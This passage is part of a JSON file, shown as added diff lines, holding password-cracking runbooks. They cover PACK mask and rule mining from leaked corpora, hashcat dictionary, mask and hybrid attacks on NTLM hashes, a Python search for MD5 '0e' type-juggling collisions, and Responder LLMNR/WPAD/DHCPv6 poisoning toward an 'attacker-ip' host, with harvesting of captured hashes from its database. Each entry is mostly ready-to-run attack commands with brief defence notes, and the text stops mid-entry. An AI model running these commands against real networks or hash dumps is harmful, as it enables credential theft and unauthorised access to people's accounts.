+    "description": "<p>This runbook evaluates how well masks generated from one leaked corpus transfer to another dataset. It is a pre-execution quality gate for mask strategy selection.</p>\n<p>Using <span style=\"color:#ef4444;font-weight:bold;\">#statsgen.py</span> and <span style=\"color:#ef4444;font-weight:bold;\">#maskgen.py --checkmasksfile/--checkmasks</span>, operators measure coverage and runtime implications before committing GPU resources.</p>\n\n<ol>\n  <li><strong>Build reference mask profile:</strong> generate mask frequencies from comparison dataset.</li>\n  <li><strong>Check transfer coverage:</strong> test candidate mask set against reference masks.</li>\n  <li><strong>Decide deployment fitness:</strong> accept/refine masks based on measured coverage and runtime.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> local PACK tools <span style=\"color:#ef4444;font-weight:bold;\">#statsgen.py</span> and <span style=\"color:#ef4444;font-weight:bold;\">#maskgen.py</span>.</li>\n  <li><strong>Attack pre-requisite:</strong> one or more corpus-derived mask files for cross-comparison.</li>\n  <li><strong>What attacker gain:</strong> better confidence in mask portability and reduced wasted cracking runtime.</li>\n  <li><strong>Detection/Defense opsec:</strong> diverse, unique passphrase patterns across users reduce cross-dataset transfer effectiveness.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>python statsgen.py ../PACK-0.0.3/archive/gawker.dic -o gawker.masks\npython maskgen.py gawker.masks --checkmasksfile rockyou.hcmask -q\npython maskgen.py gawker.masks --checkmasks=\"?u?l?l?l?l?l?d,?l?l?l?l?l?d?d\" -q</code></pre>",
+    "tags": [
+      "password-cracking",
+      "pack",
+      "mask-coverage",
+      "validation",
+      "phase:optimization"
+    ],
+    "color": "#eab308"
+  },
+  {
+    "id": "28c1599e-296c-5405-a1d8-e4a76dcaafdb",
+    "label": "PACK Rulegen Advanced Source Control",
+    "command": "python rulegen.py --verbose --password P@55w0rd123\npython rulegen.py -q --verbose --word word --password P@55w0rd123\npython rulegen.py -q --verbose --wordlist rockyou.txt --password 1pa55w0rd1\npython rulegen.py -q --verbose --password '$m0n3y$' --morerules --morewords",
+    "description": "<p>This runbook drives deep rule discovery by controlling rulegen source-word behavior, custom dictionaries, and broader search options. It is used when default source inference misses target-specific transformations.</p>\n<p>Operators use <span style=\"color:#ef4444;font-weight:bold;\">#rulegen.py</span> with forced source words (`--word`), custom lexicons (`--wordlist`), and expanded search (`--morerules --morewords`) to widen rule discovery.</p>\n\n<ol>\n  <li><strong>Baseline single-password analysis:</strong> inspect transformation chains and inferred source words.</li>\n  <li><strong>Override source behavior:</strong> force word assumptions or custom dictionaries to uncover alternative mutation rules.</li>\n  <li><strong>Expand candidate/rule breadth:</strong> run broader generation for edge-pattern discovery.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> local PACK utility <span style=\"color:#ef4444;font-weight:bold;\">#rulegen.py</span>.</li>\n  <li><strong>Attack pre-requisite:</strong> sample recovered/leaked passwords to analyze and optional custom lexical sources.</li>\n  <li><strong>What attacker gain:</strong> richer rule sets that better reflect target password mutation habits.</li>\n  <li><strong>Detection/Defense opsec:</strong> unique random passphrases limit effectiveness of transformation inference and rule recycling.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>python rulegen.py --verbose --password P@55w0rd123\npython rulegen.py -q --verbose --word word --password P@55w0rd123\npython rulegen.py -q --verbose --wordlist rockyou.txt --password 1pa55w0rd1\npython rulegen.py -q --verbose --password '$m0n3y$' --morerules --morewords</code></pre>",
+    "tags": [
+      "password-cracking",
+      "pack",
+      "rulegen",
+      "mutation-analysis",
+      "phase:optimization"
+    ],
+    "color": "#eab308"
+  },
+  {
+    "id": "27486021-7b68-5a1b-807c-c8a13ebd0228",
+    "label": "PACK Rulegen Batch Mining Replay",
+    "command": "python rulegen.py korelogic.txt -q\npython rulegen.py korelogic.txt -q -b korelogic\nhashcat -a 0 -m 1000 hashes.ntlm wordlist.txt -r korelogic-sorted.rule",
+    "description": "<p>This runbook processes password files in batch mode to generate sorted words/rules and replays top transformations in hashcat. It operationalizes rule mining from larger cracked or leaked corpora.</p>\n<p>Using <span style=\"color:#ef4444;font-weight:bold;\">#rulegen.py</span> with custom basename outputs, operators obtain reusable `*-sorted.rule` artifacts for immediate replay in <span style=\"color:#ef4444;font-weight:bold;\">#hashcat</span>.</p>\n\n<ol>\n  <li><strong>Batch-analyze plaintext set:</strong> process input file to derive rule and source-word statistics.</li>\n  <li><strong>Namespace outputs:</strong> assign custom basename for multi-dataset workflows.</li>\n  <li><strong>Replay sorted rules:</strong> apply highest-signal rules against remaining hash corpus.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> local PACK <span style=\"color:#ef4444;font-weight:bold;\">#rulegen.py</span> and <span style=\"color:#ef4444;font-weight:bold;\">#hashcat</span>.</li>\n  <li><strong>Attack pre-requisite:</strong> plaintext corpus (cracked or leaked), baseline wordlist, and target hash set.</li>\n  <li><strong>What attacker gain:</strong> frequency-ranked transformation rules with improved replay effectiveness.</li>\n  <li><strong>Detection/Defense opsec:</strong> password uniqueness and rotation reduce value of replayed learned transformations.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>python rulegen.py korelogic.txt -q\npython rulegen.py korelogic.txt -q -b korelogic\nhashcat -a 0 -m 1000 hashes.ntlm wordlist.txt -r korelogic-sorted.rule</code></pre>",
+    "tags": [
+      "password-cracking",
+      "pack",
+      "batch-analysis",
+      "hashcat-replay",
+      "phase:optimization"
+    ],
+    "color": "#eab308"
+  },
+  {
+    "id": "73b64c57-2f4f-5f37-b479-3674606bf889",
+    "label": "PACK Runtime Calibration with PPS",
+    "command": "python maskgen.py rockyou.masks --targettime 43200 --optindex -q -o rockyou.hcmask\npython maskgen.py rockyou.masks --targettime 43200 --pps 50000000 -q\nhashcat -a 3 -m 1000 hashes.ntlm rockyou.hcmask",
+    "description": "<p>This runbook calibrates mask generation runtime predictions to actual cracking throughput using PACK `--pps` tuning. It aligns planning estimates with real hardware performance.</p>\n<p>Operators generate target-time mask sets and then adjust calculations with measured keys-per-second so campaign duration assumptions are realistic.</p>\n\n<ol>\n  <li><strong>Generate baseline target-time masks:</strong> create initial plan under default speed assumptions.</li>\n  <li><strong>Apply measured pps:</strong> recalibrate mask output using real throughput figures.</li>\n  <li><strong>Execute calibrated masks:</strong> run hashcat with corrected runtime expectations.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> local PACK <span style=\"color:#ef4444;font-weight:bold;\">#maskgen.py</span> and <span style=\"color:#ef4444;font-weight:bold;\">#hashcat</span>.</li>\n  <li><strong>Attack pre-requisite:</strong> representative speed measurement for target hash mode and available hardware profile.</li>\n  <li><strong>What attacker gain:</strong> fewer planning errors and better utilization of constrained cracking windows.</li>\n  <li><strong>Detection/Defense opsec:</strong> faster calibrated cracking shortens defender response windows after hash exposure.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>python maskgen.py rockyou.masks --targettime 43200 --optindex -q -o rockyou.hcmask\npython maskgen.py rockyou.masks --targettime 43200 --pps 50000000 -q\nhashcat -a 3 -m 1000 hashes.ntlm rockyou.hcmask</code></pre>",
+    "tags": [
+      "password-cracking",
+      "pack",
+      "runtime-calibration",
+      "pps",
+      "phase:operations"
+    ],
+    "color": "#eab308"
+  },
+  {
+    "id": "f889bcf2-b1bf-51f3-9012-1c614f9b24f0",
+    "label": "PACK Stats to Mask Pipeline",
+    "command": "python statsgen.py rockyou.txt -o rockyou.masks\npython maskgen.py rockyou.masks --targettime 600 --optindex -q -o rockyou.hcmask\nhashcat -a 3 -m 1000 hashes.ntlm rockyou.hcmask",
+    "description": "<p>This runbook converts leaked password distributions into prioritized mask campaigns using PACK. Instead of guessing masks manually, it derives empirical patterns and feeds them into timed hashcat runs.</p>\n<p>The pipeline uses <span style=\"color:#ef4444;font-weight:bold;\">#statsgen.py</span> to extract mask frequencies, <span style=\"color:#ef4444;font-weight:bold;\">#maskgen.py</span> to produce target-time optimized `.hcmask` sets, then executes with <span style=\"color:#ef4444;font-weight:bold;\">#hashcat -a 3</span>.</p>\n\n<ol>\n  <li><strong>Profile corpus:</strong> transform known password list into mask statistics.</li>\n  <li><strong>Generate prioritized masks:</strong> optimize for runtime budget and expected coverage.</li>\n  <li><strong>Run mask campaign:</strong> execute generated mask file directly in hashcat brute/mask mode.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#statsgen.py</span>, <span style=\"color:#ef4444;font-weight:bold;\">#maskgen.py</span> from local `pack/` directory; <span style=\"color:#ef4444;font-weight:bold;\">#hashcat</span> from standard cracking toolchain.</li>\n  <li><strong>Attack pre-requisite:</strong> representative corpus for pattern extraction and estimated cracking speed assumptions.</li>\n  <li><strong>What attacker gain:</strong> materially better mask ordering/coverage for fixed runtime windows.</li>\n  <li><strong>Detection/Defense opsec:</strong> require long random passphrases and prevent reuse patterns; fast reset of exposed credentials reduces utility of learned mask distributions.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>python statsgen.py rockyou.txt -o rockyou.masks\npython maskgen.py rockyou.masks --targettime 600 --optindex -q -o rockyou.hcmask\nhashcat -a 3 -m 1000 hashes.ntlm rockyou.hcmask</code></pre>",
+    "tags": [
+      "password-cracking",
+      "pack",
+      "mask-prioritization",
+      "hashcat",
+      "phase:optimization"
+    ],
+    "color": "#eab308"
+  },
+  {
+    "id": "a98599d6-e81d-5fda-86ee-42f19d160bb2",
+    "label": "Parallel MD5 0e Loose Comparison Hunt",
+    "command": "python3 - <<'PY'\nimport hashlib\nfrom multiprocessing import Process, Queue, cpu_count\n\ndef loose_comparison(queue, num):\n    target = '0e'\n    plaintext = f\"a_prefix{str(num)}a_suffix\"\n    h = hashlib.md5(plaintext.encode('ascii')).hexdigest()\n    if h[:len(target)] == target and not any(x in \"abcdef\" for x in h[2:]):\n        print('plaintext: ' + plaintext + ', md5: ' + h)\n        queue.put(\"done\")\n\ndef worker(queue, thread_i, threads):\n    for num in range(thread_i, 100**50, threads):\n        loose_comparison(queue, num)\n\ndef main():\n    queue = Queue()\n    threads = cpu_count()\n    for thread_i in range(threads):\n        proc = Process(target=worker, args=(queue, thread_i, threads))\n        proc.daemon = True\n        proc.start()\n    while queue.empty():\n        pass\n\nmain()\nPY",
+    "description": "<p>This runbook performs parallel search for MD5 digests matching weak loose-comparison patterns (`0e...` with numeric tail). It targets edge cases in insecure string-to-number comparison logic.</p>\n<p>The workflow uses multiprocessing workers to partition numeric search space and stop on first qualifying digest.</p>\n\n<ol>\n  <li><strong>Define loose-comparison condition:</strong> hash starts with `0e` and remaining characters are numeric-only.</li>\n  <li><strong>Distribute search workload:</strong> worker processes split candidate ranges by CPU count.</li>\n  <li><strong>Terminate on first hit:</strong> shared queue signals successful match and exits search loop.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> Python standard libraries <span style=\"color:#ef4444;font-weight:bold;\">#hashlib</span> and <span style=\"color:#ef4444;font-weight:bold;\">#multiprocessing</span>.</li>\n  <li><strong>Attack pre-requisite:</strong> target application path vulnerable to loose numeric/hash comparison behavior.</li>\n  <li><strong>What attacker gain:</strong> candidate values that may bypass weak hash comparison checks in insecure code paths.</li>\n  <li><strong>Detection/Defense opsec:</strong> enforce strict constant-time string comparison for hashes and avoid weak type juggling patterns.</li>\n</ul>\n\n<p><strong>Core Command:</strong></p>\n<pre><code>python3 - &lt;&lt;'PY'\nimport hashlib\nfrom multiprocessing import Process, Queue, cpu_count\n\ndef loose_comparison(queue, num):\n    target = '0e'\n    plaintext = f\"a_prefix{str(num)}a_suffix\"\n    h = hashlib.md5(plaintext.encode('ascii')).hexdigest()\n    if h[:len(target)] == target and not any(x in \"abcdef\" for x in h[2:]):\n        print('plaintext: ' + plaintext + ', md5: ' + h)\n        queue.put(\"done\")\n\ndef worker(queue, thread_i, threads):\n    for num in range(thread_i, 100**50, threads):\n        loose_comparison(queue, num)\n\ndef main():\n    queue = Queue()\n    threads = cpu_count()\n    for thread_i in range(threads):\n        proc = Process(target=worker, args=(queue, thread_i, threads))\n        proc.daemon = True\n        proc.start()\n    while queue.empty():\n        pass\n\nmain()\nPY</code></pre>",
+    "tags": [
+      "password-cracking",
+      "md5",
+      "parallel-search",
+      "python",
+      "phase:special-case"
+    ],
+    "color": "#eab308"
+  },
+  {
+    "id": "b83339bf-698d-5fed-a7e7-197acee7600e",
+    "label": "Policy Masks and Rule Engineering",
+    "command": "python policygen.py --minlength 8 --maxlength 8 --minlower 1 --minupper 1 --mindigit 1 --minspecial 1 -o complexity.hcmask\npython policygen.py --minlength 8 --maxlength 8 --minlower 1 --minupper 1 --mindigit 1 --minspecial 1 -o noncompliant.hcmask -q --noncompliant\npython rulegen.py --verbose --password P@55w0rd123\npython rulegen.py leaked-passwords.txt -q -b analysis\nhashcat -a 0 -m 1000 hashes.ntlm wordlist.txt -r analysis-sorted.rule",
+    "description": "<p>This runbook uses PACK to convert known password policy constraints into executable mask sets, then derives reusable mutation rules from recovered credential data. It is designed for high-efficiency offline cracking where unrestricted brute-force is computationally wasteful.</p>\n<p><span style=\"color:#ef4444;font-weight:bold;\">#policygen.py</span> generates compliant or non-compliant mask collections, while <span style=\"color:#ef4444;font-weight:bold;\">#rulegen.py</span> extracts transformation logic from leaked/cracked passwords and feeds those rules back into <span style=\"color:#ef4444;font-weight:bold;\">#hashcat</span>.</p>\n\n<ol>\n  <li><strong>Model policy constraints:</strong> encode minimum/maximum complexity into mask generation.</li>\n  <li><strong>Generate rule intelligence:</strong> reverse likely source words and transformations from known plaintext samples.</li>\n  <li><strong>Operationalize learned rules:</strong> apply sorted output rules in focused hashcat straight attacks.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> local PACK utilities in `docs/sources-runbooks/password-cracking/pack/` (<span style=\"color:#ef4444;font-weight:bold;\">#policygen.py</span>, <span style=\"color:#ef4444;font-weight:bold;\">#rulegen.py</span>), plus <span style=\"color:#ef4444;font-weight:bold;\">#hashcat</span>.</li>\n  <li><strong>Attack pre-requisite:</strong> known or inferred policy constraints, representative cracked/leaked password corpus, and correct hash mode selection.</li>\n  <li><strong>What attacker gain:</strong> smaller but higher-value candidate space and target-specific rules that improve crack rate on remaining hashes.</li>\n  <li><strong>Detection/Defense opsec:</strong> enforce long random passphrases, disable predictable composition habits, and rotate passwords quickly after exposure indicators.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>python policygen.py --minlength 8 --maxlength 8 --minlower 1 --minupper 1 --mindigit 1 --minspecial 1 -o complexity.hcmask\npython policygen.py --minlength 8 --maxlength 8 --minlower 1 --minupper 1 --mindigit 1 --minspecial 1 -o noncompliant.hcmask -q --noncompliant\npython rulegen.py --verbose --password P@55w0rd123\npython rulegen.py leaked-passwords.txt -q -b analysis\nhashcat -a 0 -m 1000 hashes.ntlm wordlist.txt -r analysis-sorted.rule</code></pre>",
+    "tags": [
+      "password-cracking",
+      "pack",
+      "policy-modeling",
+      "rulegen",
+      "phase:optimization"
+    ],
+    "color": "#eab308"
+  },
+  {
+    "id": "2aa9c330-f93f-5b11-b3d0-20576706eda0",
+    "label": "Random Rule Discovery and Harvesting",
+    "command": "hashcat -a 0 -m 1000 hashes.ntlm wordlist.txt --generate-rules=10000 --generate-rules-func-min=1 --generate-rules-func-max=4 --generate-rules-func-sel=ioTlc\nhashcat -a 0 -m 1000 hashes.ntlm wordlist.txt --debug-mode=1 --debug-file=matched.rule\necho \"WORd\" | hashcat --stdout -j 'c'",
+    "description": "<p>This runbook is an iterative optimization technique: generate large random rule sets, execute them against target hashes, and retain only rules that produce successful cracks.</p>\n<p>It combines <span style=\"color:#ef4444;font-weight:bold;\">#hashcat --generate-rules</span> with debug extraction (<span style=\"color:#ef4444;font-weight:bold;\">#--debug-mode</span>, <span style=\"color:#ef4444;font-weight:bold;\">#--debug-file</span>) to build an evidence-backed, target-specific mutation corpus.</p>\n\n<ol>\n  <li><strong>Generate exploratory rule-space:</strong> produce random rule combinations bounded by operator/function constraints.</li>\n  <li><strong>Execute and capture wins:</strong> run against target hashes while persisting matched rules to debug output.</li>\n  <li><strong>Recycle successful rules:</strong> promote matched rules into follow-on optimized cracking passes.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#hashcat</span> rule engine and local rule documentation.</li>\n  <li><strong>Attack pre-requisite:</strong> baseline cracked output or a target set where mutation discovery is justified by remaining uncracked hashes.</li>\n  <li><strong>What attacker gain:</strong> custom high-signal rule files tuned to the target’s real password transformation behavior.</li>\n  <li><strong>Detection/Defense opsec:</strong> break attacker feedback loops with strong unique passwords and forced reset after credential exposure events.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>hashcat -a 0 -m 1000 hashes.ntlm wordlist.txt --generate-rules=10000 --generate-rules-func-min=1 --generate-rules-func-max=4 --generate-rules-func-sel=ioTlc\nhashcat -a 0 -m 1000 hashes.ntlm wordlist.txt --debug-mode=1 --debug-file=matched.rule\necho \"WORd\" | hashcat --stdout -j 'c'</code></pre>",
+    "tags": [
+      "password-cracking",
+      "hashcat",
+      "rules-engine",
+      "optimization",
+      "phase:tuning"
+    ],
+    "color": "#eab308"
+  },
+  {
+    "id": "8c415940-3f70-5146-bdc8-5315f68b4ea3",
+    "label": "Responder Capture to Crack Mapping",
+    "command": "sudo python3 Responder.py -I eth0 -b\nldapsearch -H ldap://attacker-ip -D \"CN=user,DC=corp,DC=local\" -w password\ndsquery user -d attacker-ip\nhashcat -m 5600 smb-ntlmv2.txt wordlist.txt\nhashcat -m 7500 kerberos-asreq.txt wordlist.txt",
+    "description": "<p>This runbook links protocol-triggered credential captures in Responder to immediate offline cracking modes. It is intended for rapid conversion of captured artifacts into recoverable credentials.</p>\n<p>It combines active capture paths (HTTP Basic/NTLM, LDAP, RDP, WinRM triggers) with direct cracking handoff to <span style=\"color:#ef4444;font-weight:bold;\">#hashcat</span> modes such as NetNTLMv2 and Kerberos AS-REQ.</p>\n\n<ol>\n  <li><strong>Trigger protocol auth flows:</strong> induce victim systems/tools to authenticate toward attacker-controlled responder services.</li>\n  <li><strong>Collect and classify artifact type:</strong> map captures by protocol and hash family.</li>\n  <li><strong>Run matching crack mode:</strong> execute format-specific offline cracking immediately.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#Responder.py</span>, <span style=\"color:#ef4444;font-weight:bold;\">#hashcat</span>, protocol trigger tooling (`ldapsearch`, `dsquery`).</li>\n  <li><strong>Attack pre-requisite:</strong> network position allowing auth interception/poisoning and reachable victim services over relevant ports (for example <span style=\"color:#3b82f6;font-weight:bold;\">TCP 80/389/3389/5985</span>).</li>\n  <li><strong>What attacker gain:</strong> crackable NetNTLMv2/AS-REQ artifacts and possible cleartext credentials.</li>\n  <li><strong>Detection/Defense opsec:</strong> enforce SMB signing and modern auth controls, detect rogue responder behavior, and alert on unusual auth destination patterns.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>sudo python3 Responder.py -I eth0 -b\nldapsearch -H ldap://attacker-ip -D \"CN=user,DC=corp,DC=local\" -w password\ndsquery user -d attacker-ip\nhashcat -m 5600 smb-ntlmv2.txt wordlist.txt\nhashcat -m 7500 kerberos-asreq.txt wordlist.txt</code></pre>",
+    "tags": [
+      "password-cracking",
+      "responder",
+      "netntlmv2",
+      "kerberos",
+      "phase:collection"
+    ],
+    "color": "#eab308"
+  },
+  {
+    "id": "12671c36-2605-5618-8c34-10f06d346774",
+    "label": "Responder SQLite Artifact Mining",
+    "command": "sqlite3 Responder.db\n.tables\nSELECT * FROM hashes;\n.mode csv\n.output hashes.csv\nSELECT * FROM hashes;\n.quit",
+    "description": "<p>This runbook extracts and normalizes captured credential intelligence from Responder’s SQLite store and log structure for cracking queues, reporting, and correlation.</p>\n<p>It focuses on <span style=\"color:#ef4444;font-weight:bold;\">#Responder.db</span> interrogation with <span style=\"color:#ef4444;font-weight:bold;\">#sqlite3</span>, table inspection, and CSV export for downstream automation.</p>\n\n<ol>\n  <li><strong>Open local artifact database:</strong> inspect schema and captured entries.</li>\n  <li><strong>Query captured hashes:</strong> extract relevant records for cracking and incident documentation.</li>\n  <li><strong>Export structured evidence:</strong> serialize selected data to CSV for external tooling.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#sqlite3</span> and local Responder artifact layout (`Responder.db`, `logs/`).</li>\n  <li><strong>Attack pre-requisite:</strong> prior credential capture activity generating Responder database/log entries.</li>\n  <li><strong>What attacker gain:</strong> organized credential artifact inventory and improved cracking queue management.</li>\n  <li><strong>Detection/Defense opsec:</strong> protect and monitor systems for unauthorized credential-harvest tooling; centralize log integrity controls to detect tampering/exfiltration.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>sqlite3 Responder.db\n.tables\nSELECT * FROM hashes;\n.mode csv\n.output hashes.csv\nSELECT * FROM hashes;\n.quit</code></pre>",
+    "tags": [
+      "password-cracking",
+      "responder",
+      "sqlite",
+      "artifact-management",
+      "phase:post-collection"
+    ],
+    "color": "#eab308"
+  },
+  {
+    "id": "68bcfc04-5cf1-5a1f-9478-9b6d6c4eaabb",
+    "label": "Responder Passive to Active Campaign",
+    "command": "sudo python3 Responder.py -I eth0 -A -v\nsudo python3 Responder.py -I eth0 --dhcpv6 -v\nsudo python3 Responder.py -I eth0 -Pvd\nsudo python3 Responder.py -I eth0 -v",
+    "description": "<p>This runbook stages Responder operations from low-noise passive analysis to active poisoning and WPAD/DHCPv6 abuse. It is designed to progressively escalate capture posture with better situational awareness.</p>\n<p>The sequence starts with <span style=\"color:#ef4444;font-weight:bold;\">#Responder.py -A</span> analysis mode, then activates targeted poisoning controls such as <span style=\"color:#ef4444;font-weight:bold;\">#--dhcpv6</span> and <span style=\"color:#ef4444;font-weight:bold;\">#-Pvd</span>.</p>\n\n<ol>\n  <li><strong>Baseline traffic behavior:</strong> observe name-resolution/auth flows in passive mode.</li>\n  <li><strong>Escalate poisoning controls:</strong> enable DHCPv6 and WPAD-oriented response capabilities.</li>\n  <li><strong>Run active capture mode:</strong> perform full poisoning/capture operation and harvest credential artifacts.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#Responder.py</span> from local responder source set.</li>\n  <li><strong>Attack pre-requisite:</strong> L2/L3 network position to influence victim broadcast/name-resolution behavior; reachable victim endpoints and services over relevant ports (for example <span style=\"color:#3b82f6;font-weight:bold;\">TCP 80/445/3389</span> and DHCPv6 paths).</li>\n  <li><strong>What attacker gain:</strong> captured NTLM/Kerberos/cleartext authentication artifacts for offline cracking or relay chains.</li>\n  <li><strong>Detection/Defense opsec:</strong> disable LLMNR/NBT-NS where possible, enforce SMB signing, deploy DHCPv6 guards, monitor rogue responder signatures and abnormal auth failures.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>sudo python3 Responder.py -I eth0 -A -v\nsudo python3 Responder.py -I eth0 --dhcpv6 -v\nsudo python3 Responder.py -I eth0 -Pvd\nsudo python3 Responder.py -I eth0 -v</code></pre>",
+    "tags": [
+      "password-cracking",
+      "responder",
+      "credential-capture",
+      "poisoning",
+      "phase:collection"
+    ],
+    "color": "#eab308"
+  },
+  {
+    "id": "3d86ae20-eb59-53b4-8b0c-2bcbf15686e7",
+    "label": "Hashcat Dictionary plus Rules Baseline",
+    "command": "hashcat -a 0 -m 1000 hashes.ntlm rockyou.txt -r rules/best66.rule\nhashcat -a 0 -m 0 hashes.md5 wordlist.txt -r rules/best66.rule\nhashcat -m 400 example400.hash wordlist.txt -r pattern.rule --speed-only -S",
+    "description": "<p>This runbook establishes the <strong>first production cracking pass</strong> using curated dictionaries plus deterministic rule amplification. It is the highest-yield starting point for most real assessments because it targets human password behavior before expensive brute-force phases.</p>\n<p>The workflow pairs <span style=\"color:#ef4444;font-weight:bold;\">#hashcat -a 0</span> with rulesets (for example <span style=\"color:#ef4444;font-weight:bold;\">#best66.rule</span>) and optionally enables <span style=\"color:#ef4444;font-weight:bold;\">#-S</span> when candidate generation bottlenecks occur (tiny base list, huge rules, slow/salted targets).</p>\n\n<ol>\n  <li><strong>Set cracking mode:</strong> choose exact hash mode and baseline dictionary based on triage output.</li>\n  <li><strong>Amplify candidates:</strong> apply vetted rules to expand probable user transformations (case flips, suffix digits, symbol substitutions).</li>\n  <li><strong>Optimize generation path:</strong> for small lists and large rule stacks, enable <span style=\"color:#ef4444;font-weight:bold;\">#-S</span> to shift candidate generation behavior and improve feed efficiency.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#hashcat</span> (`/usr/bin/hashcat` on Kali), stock and custom rule files in the local profile folder (`hashcat/rules-*`).</li>\n  <li><strong>Attack pre-requisite:</strong> correctly identified hash mode, valid hash list, and representative wordlist/rule strategy aligned to target context.</li>\n  <li><strong>What attacker gain:</strong> first-wave credential recovery with minimal cost, producing recovered passwords that can seed follow-on loopback/rulegen campaigns.</li>\n  <li><strong>Detection/Defense opsec:</strong> strengthen password policy against predictable patterns; monitor for upstream credential-theft vectors (LSASS, AD dumps, relay tooling) that feed offline cracking operations.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>hashcat -a 0 -m 1000 hashes.ntlm rockyou.txt -r rules/best66.rule\nhashcat -a 0 -m 0 hashes.md5 wordlist.txt -r rules/best66.rule\nhashcat -m 400 example400.hash wordlist.txt -r pattern.rule --speed-only -S</code></pre>",
+    "tags": [
+      "password-cracking",
+      "hashcat",
+      "dictionary-attack",
+      "rules-engine",
+      "phase:offline-crack"
+    ],
+    "color": "#eab308"
+  },
+  {
+    "id": "7c544d33-9aca-55de-927d-1f24ddc1482e",
+    "label": "Structured Mask and Increment Cracking",
+    "command": "hashcat -a 3 -m 1000 hashes.ntlm ?u?l?l?l?l?l?l?l?d\nhashcat -a 3 -m 1000 hashes.ntlm -1 ?d?s ?u?l?l?l?l?l?l?l?1\nhashcat -a 3 -m 1000 hashes.ntlm -i --increment-min=6 --increment-max=9 ?u?l?l?l?l?l?l?l?d\nhashcat -a 3 hashes.txt mask_file.hcmask",
+    "description": "<p>This runbook performs deterministic keyspace traversal using masks, custom charsets, and bounded increment ranges. It is used when password structure is partially known (capitalized word + digits, policy-driven composition, fixed lengths).</p>\n<p>By leveraging <span style=\"color:#ef4444;font-weight:bold;\">#hashcat -a 3</span> with custom charsets and increment controls, the operator avoids random brute force and focuses on high-probability pattern space.</p>\n\n<ol>\n  <li><strong>Model expected format:</strong> encode real password shape assumptions into mask syntax (`?u`, `?l`, `?d`, `?s`).</li>\n  <li><strong>Constrain keyspace:</strong> use minimum/maximum length increment boundaries to control runtime explosion.</li>\n  <li><strong>Operationalize reusable masks:</strong> store prioritized masks in <span style=\"color:#ef4444;font-weight:bold;\">#.hcmask</span> files for repeatable campaigns.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#hashcat</span>, local mask/rule docs in the profile source set, and optional precomputed mask files (`*.hcmask`).</li>\n  <li><strong>Attack pre-requisite:</strong> accurate hash mode plus defensible assumptions about target password format and length policy.</li>\n  <li><strong>What attacker gain:</strong> efficient cracking against structured password choices without exhausting full brute-force space.</li>\n  <li><strong>Detection/Defense opsec:</strong> enforce long unpredictable passphrases and deny pattern-based policy leakage; monitor and block upstream hash extraction vectors.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>hashcat -a 3 -m 1000 hashes.ntlm ?u?l?l?l?l?l?l?l?d\nhashcat -a 3 -m 1000 hashes.ntlm -1 ?d?s ?u?l?l?l?l?l?l?l?1\nhashcat -a 3 -m 1000 hashes.ntlm -i --increment-min=6 --increment-max=9 ?u?l?l?l?l?l?l?l?d\nhashcat -a 3 hashes.txt mask_file.hcmask</code></pre>",
+    "tags": [
+      "password-cracking",
+      "hashcat",
+      "mask-attack",
+      "custom-charset",
+      "phase:offline-crack"
+    ],
+    "color": "#eab308"
+  },
+  {
+    "id": "7bb7b76f-9108-57f4-9a6c-a07824b092a5",
+    "label": "Hybrid Wordlist and Mask Attacks",
+    "command": "hashcat -a 6 -m 1000 hashes.ntlm wordlist.txt ?d?d?d?d\nhashcat -a 7 -m 1000 hashes.ntlm ?d?d?d?d wordlist.txt",
+    "description": "<p>This runbook targets passwords that combine a dictionary root with a structured prefix or suffix. It bridges the gap between pure dictionary attacks and full brute force.</p>\n<p>With <span style=\"color:#ef4444;font-weight:bold;\">#hashcat -a 6</span> (wordlist+mask) and <span style=\"color:#ef4444;font-weight:bold;\">#hashcat -a 7</span> (mask+wordlist), the operator appends or prepends deterministic patterns such as years, counters, or short token blocks.</p>\n\n<ol>\n  <li><strong>Pick candidate root set:</strong> select high-confidence words from breach context, organization terms, or recovered passwords.</li>\n  <li><strong>Define structured append/prepend masks:</strong> encode likely numeric/symbolic layouts without opening full keyspace.</li>\n  <li><strong>Run both orientations:</strong> test suffix-heavy and prefix-heavy user habits independently.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#hashcat</span> hybrid modes from standard hashcat builds.</li>\n  <li><strong>Attack pre-requisite:</strong> known hash mode, usable root wordlist, and realistic mask assumptions from target password style.</li>\n  <li><strong>What attacker gain:</strong> higher crack rate on policy-driven passwords like `Word2025!` or `1234Word` that evade pure dictionary runs.</li>\n  <li><strong>Detection/Defense opsec:</strong> enforce 